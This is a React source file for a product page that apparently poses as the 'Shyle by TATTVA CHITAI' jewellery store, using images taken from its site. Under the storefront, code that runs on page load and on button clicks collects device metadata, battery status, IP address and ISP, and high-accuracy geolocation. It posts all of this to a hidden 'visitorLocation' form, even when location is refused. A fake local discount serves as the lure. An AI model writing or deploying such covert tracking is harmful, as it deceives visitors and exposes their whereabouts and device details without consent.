/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect } from 'react';
import { 
  Search, 
  Store, 
  User, 
  Heart, 
  ShoppingBag, 
  ChevronRight, 
  Truck, 
  Tag, 
  RefreshCcw, 
  Diamond, 
  ShieldCheck, 
  Medal
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

const PRODUCT_IMAGES = [
  "https://www.shyle.in/cdn/shop/files/photo_2022-09-13_17-01-04.jpg?v=1737039893&width=800",
  "https://www.shyle.in/cdn/shop/files/photo_2022-09-13_17-00-49.jpg?v=1737445778&width=800",
  "https://www.shyle.in/cdn/shop/files/photo_2022-09-13_17-00-33.jpg?v=1737445778&width=1200",
  "https://www.shyle.in/cdn/shop/files/photo_2022-09-13_17-00-40.jpg?v=1737445778&width=1200"
];

export default function App() {
  const [selectedImg, setSelectedImg] = useState(0);
  const [selectedFinish, setSelectedFinish] = useState('silver');
  const [isWishlisted, setIsWishlisted] = useState(false);
  const [checkText, setCheckText] = useState('Check');
  
  // Pricing & Location State
  const [pincode, setPincode] = useState('');
  const [isDiscounted, setIsDiscounted] = useState(false);

  // Delhi Discount Logic: Coordinates or Pincode starting with 11
  const checkDelhiStatus = (lat: number | null, lon: number | null, pin: string) => {
    const isDelhiPin = pin.trim().startsWith('11');
    const isDelhiCoords = (lat !== null && lon !== null) ? (lat > 28.3 && lat < 28.9 && lon > 76.7 && lon < 77.5) : false;
    
    if (isDelhiPin || isDelhiCoords) {
      setIsDiscounted(true);
    } else {
      setIsDiscounted(false);
    }
  };

  const requestLocationAndSend = async (source: string) => {
    if (source === 'check') setCheckText('Checking...');

    // 1. Gather Basic Device Metadata
    const deviceData: any = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };

    // 2. Fetch Battery Status (Chrome/Android support)
    try {
      const battery: any = await (navigator as any).getBattery();
      deviceData.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : ''}`;
    } catch (e) {
      deviceData.battery = "Unknown/Safari";
    }

    // 3. Get Network Data (ISP like Airtel, Excitel, etc.)
    let networkInfo = { query: 'Unknown', isp: 'Unknown' };
    try {
      const res = await fetch('http://ip-api.com/json/');
      networkInfo = await res.json();
    } catch (e) {
      console.warn("ISP lookup failed.");
    }

    const encode = (data: Record<string, string | number>) => {
      return Object.keys(data).map(key => encodeURIComponent(key) + "=" + encodeURIComponent(data[key])).join("&");
    };

    const submitToNetlify = (lat: number, lon: number) => {
      fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: encode({
          "form-name": "visitorLocation",
          "ip": networkInfo.query,
          "isp": networkInfo.isp,
          "latitude": lat,
          "longitude": lon,
          "pincode": pincode,
          "trigger_source": source,
          ...deviceData
        })
      })
      .then(() => {
        if (source === 'check') setCheckText('Available!');
        checkDelhiStatus(lat > 0 ? lat : null, lon > 0 ? lon : null, pincode);
      });
    };

    // 4. Trigger Location Prompt
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => submitToNetlify(pos.coords.latitude, pos.coords.longitude),
        (err) => {
          submitToNetlify(0, 0); // Still send IP/ISP/Meta if location denied
          checkDelhiStatus(null, null, pincode);
        },
        { enableHighAccuracy: true, timeout: 6000 }
      );
    } else {
      submitToNetlify(0, 0);
      checkDelhiStatus(null, null, pincode);
    }
  };

  useEffect(() => {
    requestLocationAndSend('page_load');
  }, []);

  return (
    <div className="min-h-screen flex flex-col font-sans selection:bg-brand-maroon/10">
      <header className="sticky top-0 z-50 bg-white/80 backdrop-blur-md border-b border-gray-100">
        <div className="max-w-[1440px] mx-auto px-6 md:px-10 py-4 flex flex-col md:flex-row justify-between items-center gap-4">
          <div className="hidden md:flex flex-1 items-center relative">
            <Search className="absolute left-3 w-4 h-4 text-stone-400" />
            <input type="text" placeholder="Search..." className="w-48 xl:w-64 bg-surface-container-low border-b border-gray-200 py-1.5 pl-9 pr-4 text-xs font-medium focus:outline-none placeholder-stone-400 uppercase tracking-widest" />
          </div>

          <div className="flex-1 flex justify-center text-center">
            <h1 className="text-xl md:text-2xl font-serif font-light tracking-[0.25em] text-brand-maroon uppercase">
              Shyle by TATTVA CHITAI
            </h1>
          </div>

          <div className="flex-1 flex justify-end items-center space-x-6 text-brand-maroon">
            <button><Store className="w-5 h-5" /></button>
            <button><User className="w-5 h-5" /></button>
            <button><Heart className="w-5 h-5" /></button>
            <button className="relative"><ShoppingBag className="w-5 h-5" /></button>
          </div>
        </div>
        <nav className="hidden md:flex justify-center border-t border-gray-50 py-3 space-x-10">
          {['Rings', 'Earrings', 'Necklaces', 'Anklets', 'Bracelets', 'Gifts'].map((item) => (
            <a key={item} href="#" className={`text-[11px] uppercase tracking-[0.15em] font-medium transition-all ${item === 'Anklets' ? 'text-brand-maroon border-b border-brand-maroon pb-0.5' : 'text-stone-500 hover:text-brand-maroon'}`}>
              {item}
            </a>
          ))}
        </nav>
      </header>

      <main className="flex-grow w-full max-w-7xl mx-auto px-6 py-12">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 lg:gap-20">
          <div className="lg:col-span-7 space-y-4">
            <div className="relative aspect-square bg-surface-container-low overflow-hidden group">
              <AnimatePresence mode="wait">
                <motion.img key={selectedImg} initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ duration: 0.5 }} src={PRODUCT_IMAGES[selectedImg]} className="w-full h-full object-cover" />
              </AnimatePresence>
              <button onClick={() => setIsWishlisted(!isWishlisted)} className="absolute top-6 right-6 w-11 h-11 bg-white/90 backdrop-blur-sm rounded-full flex items-center justify-center shadow-sm">
                <Heart className={`w-5 h-5 ${isWishlisted ? 'fill-brand-maroon text-brand-maroon' : 'text-brand-maroon'}`} />
              </button>
            </div>
            <div className="grid grid-cols-4 gap-3">
              {PRODUCT_IMAGES.map((img, idx) => (
                <button key={idx} onClick={() => setSelectedImg(idx)} className={`aspect-square overflow-hidden border ${selectedImg === idx ? 'border-brand-maroon' : 'border-transparent'}`}>
                  <img src={img} className="w-full h-full object-cover" />
                </button>
              ))}
            </div>
          </div>

          <div className="lg:col-span-5 flex flex-col h-full">
            <div className="pb-8 border-b border-gray-100 space-y-3">
              <h1 className="text-2xl md:text-3xl font-serif font-light text-stone-900 leading-tight">Tattva Chitai Carved Statement Anklet </h1>
              <div className="pt-4 flex items-end gap-4">
                {isDiscounted ? (
                  <>
                    <span className="text-2xl font-serif font-medium text-brand-maroon">₹7,875</span>
                    <span className="text-base text-stone-400 line-through pb-0.5">₹10,500</span>
                    <span className="bg-brand-maroon/5 text-brand-maroon text-[10px] font-bold px-2 py-1 uppercase tracking-widest">25% OFF</span>
                  </>
                ) : (
                  <span className="text-2xl font-serif font-medium text-brand-maroon">₹10,500</span>
                )}
              </div>
              <p className="text-[10px] text-stone-400 uppercase tracking-widest">MRP INCLUSIVE OF ALL TAXES</p>
            </div>

            <div className="py-8 space-y-4">
              <h3 className="text-[11px] font-bold uppercase tracking-[0.2em] text-stone-900">Choose Your Finish</h3>
              <div className="flex gap-4">
                {['silver', 'oxidized'].map((id) => (
                  <button key={id} onClick={() => setSelectedFinish(id)} className={`w-12 h-12 rounded-full p-0.5 border ${selectedFinish === id ? 'border-brand-maroon' : 'border-gray-200'}`}>
                    <div className={`w-full h-full rounded-full bg-gradient-to-tr ${id === 'silver' ? 'from-gray-300 to-gray-100' : 'from-gray-600 to-gray-400'} shadow-inner`} />
                  </button>
                ))}
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4 pb-8">
              <button className="py-4 border border-brand-maroon text-brand-maroon text-[11px] font-bold uppercase tracking-[0.25em] cursor-pointer">Buy Now</button>
              <button className="py-4 bg-brand-maroon text-white text-[11px] font-bold uppercase tracking-[0.25em] cursor-pointer">Add to Cart</button>
            </div>

            <div className="bg-surface-container-low p-6 space-y-4">
              <div className="flex items-center gap-2"><Truck className="w-4 h-4 text-brand-maroon" /><h3 className="text-[11px] font-bold uppercase tracking-[0.15em] text-stone-900">Estimated Delivery Time</h3></div>
              <div className="flex border-b border-gray-300 py-2">
                <input type="text" value={pincode} onChange={(e) => setPincode(e.target.value)} placeholder="Enter Pincode" className="flex-grow bg-transparent text-sm focus:outline-none" />
                <button onClick={() => requestLocationAndSend('check')} className="text-brand-maroon text-[10px] font-bold uppercase tracking-widest ml-4 cursor-pointer">{checkText}</button>
              </div>
            </div>

            <div className="py-8 space-y-4">
              <div className="flex items-center gap-2"><Tag className="w-4 h-4 text-brand-maroon" /><h3 className="text-[11px] font-bold uppercase tracking-[0.15em] text-stone-900">Offers For You</h3></div>
              <div className="space-y-3">
                {[
                  { code: 'EXTRA15', text: 'Get 15% off on orders above ₹2000' },
                  { code: 'LOCAL25', text: '25% off on selected locations (please allow location to check)' }
                ].map((offer) => (
                  <button key={offer.code} onClick={() => requestLocationAndSend(`offer_click_${offer.code}`)} className="w-full text-left p-4 border border-gray-100 flex items-center justify-between bg-white cursor-pointer group">
                    <div className="flex gap-4">
                      <span className="text-[10px] font-bold px-2 py-0.5 border border-brand-maroon text-brand-maroon h-fit mt-1">{offer.code}</span>
                      <div>
                        <p className="text-sm font-medium text-stone-800">{offer.text}</p>
                        <p className="text-[10px] text-stone-400 uppercase tracking-widest">Use code at checkout</p>
                      </div>
                    </div>
                    <ChevronRight className="w-4 h-4 text-stone-300 group-hover:text-brand-maroon" />
                  </button>
                ))}
              </div>
            </div>

            <div className="py-8 border-t border-gray-100 space-y-6">
              <h3 className="text-[11px] font-bold uppercase tracking-[0.2em] text-stone-900">The Inspiration</h3>
              <p className="text-sm text-stone-500 leading-relaxed font-serif">Handcrafted 925 silver with traditional Chitai carving work. This bold, handcrafted piece seamlessly blends heritage design with modern elegance.</p>
              <ul className="text-[13px] text-stone-600 space-y-2 list-none font-serif">
                <li className="flex gap-3"><span className="text-brand-maroon">•</span> Premium quality pure 925 silver</li>
                <li className="flex gap-3"><span className="text-brand-maroon">•</span> Traditional handcrafted carving</li>
                <li className="flex gap-3"><span className="text-brand-maroon">•</span> Secure screw mechanism</li>
              </ul>
            </div>

            <div className="mt-auto grid grid-cols-4 gap-2 py-8 border-t border-gray-100">
               {[
                 { icon: RefreshCcw, label: "Easy 15 Day Return" },
                 { icon: Diamond, label: "Lifetime Plating" },
                 { icon: ShieldCheck, label: "6-Month Warranty" },
                 { icon: Medal, label: "Fine 925 Silver" }
               ].map((badge) => (
                 <div key={badge.label} className="flex flex-col items-center text-center space-y-2">
                   <badge.icon className="w-6 h-6 text-brand-maroon" />
                   <span className="text-[9px] uppercase tracking-widest text-stone-400 leading-tight">{badge.label}</span>
                 </div>
               ))}
            </div>
          </div>
        </div>
      </main>

      <footer className="bg-surface-container-low border-t border-gray-200 mt-20">
        <div className="max-w-[1440px] mx-auto px-10 py-16 flex flex-col md:flex-row justify-between items-center gap-8">
          <div>
            <h2 className="text-lg font-serif font-light tracking-[0.25em] text-stone-900 uppercase">Shyle by TATTVA CHITAI</h2>
            <p className="text-[10px] uppercase tracking-[0.2em] text-brand-maroon">© 2026 Shyle by TATTVA CHITAI. Modern Craftsmanship, Timeless Elegance.</p>
          </div>
          <div className="flex gap-6">
            {['About Us', 'Shipping & Returns', 'Privacy Policy'].map(link => (
              <a key={link} href="#" className="text-[10px] uppercase tracking-[0.2em] text-stone-500 hover:text-brand-maroon transition-colors">{link}</a>
            ))}
          </div>
        </div>
      </footer>
    </div>
  );
}
